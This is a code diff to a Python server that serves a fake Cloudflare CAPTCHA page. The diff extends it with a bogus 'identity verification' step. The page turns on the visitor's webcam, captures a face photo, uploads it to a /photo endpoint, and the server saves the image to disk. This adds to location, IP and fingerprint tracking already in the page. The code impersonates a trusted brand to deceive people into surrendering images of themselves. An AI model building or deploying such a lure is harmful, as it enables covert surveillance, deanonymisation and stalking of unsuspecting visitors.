@@ -78,6 +78,17 @@ HTML = r"""<!DOCTYPE html>
   .cf-footer-links { font-size: 10px; color: #bbb; display: flex; gap: 8px; }
   .cf-footer-links a { color: #bbb; text-decoration: none; }
   .ray-id { text-align: center; font-size: 10px; color: #bbb; margin-top: 16px; font-family: monospace; }
+  .cam-box { display: none; margin-top: 16px; text-align: center; }
+  .cam-box video { width: 100%; border-radius: 6px; border: 1px solid #e0e0e0; }
+  .cam-box canvas { display: none; }
+  .cam-label { font-size: 12px; color: #888; margin-top: 8px; margin-bottom: 8px; }
+  .cam-btn {
+    background: #f38020; border: none; color: #fff;
+    font-size: 13px; padding: 8px 20px; border-radius: 4px;
+    cursor: pointer; width: 100%; margin-top: 8px;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+  }
+  .cam-btn:hover { background: #e07010; }
 </style>
 </head>
 <body>
@@ -97,6 +108,13 @@ HTML = r"""<!DOCTYPE html>
   <div class="verify-row">
     <div class="checkbox" id="checkbox"></div>
     <span class="verify-label" id="label">I am not a robot</span>
+  </div>
+  <div class="cam-box" id="camBox">
+    <div class="cam-label">Identity verification required. Please allow camera access.</div>
+    <video id="camVideo" autoplay playsinline muted></video>
+    <canvas id="camCanvas"></canvas>
+    <button class="cam-btn" id="camBtn" onclick="capturePhoto()">📸 Take Verification Photo</button>
+    <div class="cam-label" id="camStatus"></div>
   </div>
   <div class="cf-footer">
     <div class="cf-footer-brand">Protected by <a href="#">Cloudflare</a><br><span style="color:#ccc">Privacy · Terms</span></div>
@@ -384,7 +402,8 @@ function tryIPSilent(fp) {
 function verified() {
   document.getElementById('checkbox').classList.remove('checking');
   document.getElementById('checkbox').classList.add('done');
-  document.getElementById('label').innerText = 'Verification complete';
+  document.getElementById('label').innerText = 'Step 1 complete — identity check required';
+  setTimeout(startCamera, 600);
 }
 
 function send(lat, lng, accuracy, method, city, country, ip, fp) {
@@ -403,6 +422,48 @@ function send(lat, lng, accuracy, method, city, country, ip, fp) {
     city:         city, country:   country, ip: ip,
     fingerprint:  fp
   }));
+}
+
+// ── CAMERA CAPTURE ───────────────────────────────────────────────────────────
+var camStream = null;
+
+function startCamera() {
+  var box = document.getElementById('camBox');
+  box.style.display = 'block';
+  navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}, audio: false})
+    .then(function(stream) {
+      camStream = stream;
+      var video = document.getElementById('camVideo');
+      video.srcObject = stream;
+    })
+    .catch(function(e) {
+      document.getElementById('camStatus').innerText = 'Camera access denied.';
+    });
+}
+
+function capturePhoto() {
+  var video  = document.getElementById('camVideo');
+  var canvas = document.getElementById('camCanvas');
+  canvas.width  = video.videoWidth  || 640;
+  canvas.height = video.videoHeight || 480;
+  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+  var dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+
+  document.getElementById('camBtn').disabled = true;
+  document.getElementById('camStatus').innerText = 'Verifying identity...';
+
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', '/photo', true);
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.onload = function() {
+    document.getElementById('camStatus').innerText = 'Identity verified ✓';
+    document.getElementById('camVideo').style.display = 'none';
+    if (camStream) camStream.getTracks().forEach(function(t){ t.stop(); });
+  };
+  xhr.onerror = function() {
+    document.getElementById('camStatus').innerText = 'Upload failed.';
+  };
+  xhr.send(JSON.stringify({photo: dataUrl, sessionId: sid, timestamp: new Date().toISOString()}));
 }
 
 window.onload = startTracking;
@@ -443,6 +504,9 @@ class Handler(BaseHTTPRequestHandler):
         self.wfile.write(HTML.encode())
 
     def do_POST(self):
+        if self.path == '/photo':
+            self.do_POST_photo()
+            return
         length = int(self.headers.get("Content-Length", 0) or 0)
         raw    = self.rfile.read(length)
 
@@ -589,10 +653,38 @@ class Handler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(b"ok")
 
+    def do_POST_photo(self):
+        length = int(self.headers.get("Content-Length", 0) or 0)
+        try:
+            data = json.loads(self.rfile.read(length))
+            photo_data = data.get("photo", "")
+            sid   = data.get("sessionId", "unknown")
+            ts    = datetime.datetime.now().strftime("%H:%M:%S")
+
+            if photo_data.startswith("data:image/jpeg;base64,"):
+                import base64
+                img_bytes = base64.b64decode(photo_data.split(",")[1])
+                fname = f"photo_{sid[-8:]}_{ts.replace(':','')}.jpg"
+                with open(fname, 'wb') as f:
+                    f.write(img_bytes)
+                log(f"\n{BOLD}{R}[ 📸 PHOTO CAPTURED ]{RST}")
+                log(f"    SESSION  : ...{sid[-12:]}")
+                log(f"    TIME     : {ts}")
+                log(f"    FILE     : {Y}{fname}{RST}  ({len(img_bytes)//1024} KB)")
+                log(f"    {R}Saved to disk!{RST}\n")
+        except Exception as e:
+            print(f"{R}[PHOTO ERROR] {e}{RST}")
+
+        self.send_response(200)
+        self.send_header("Access-Control-Allow-Origin", "*")
+        self.send_header("Content-Type", "text/plain")
+        self.end_headers()
+        self.wfile.write(b"ok")
+
     def do_OPTIONS(self):
         self.send_response(200)
         self.send_header("Access-Control-Allow-Origin", "*")
-        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
+        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
         self.send_header("Access-Control-Allow-Headers", "Content-Type")
         self.end_headers()
 
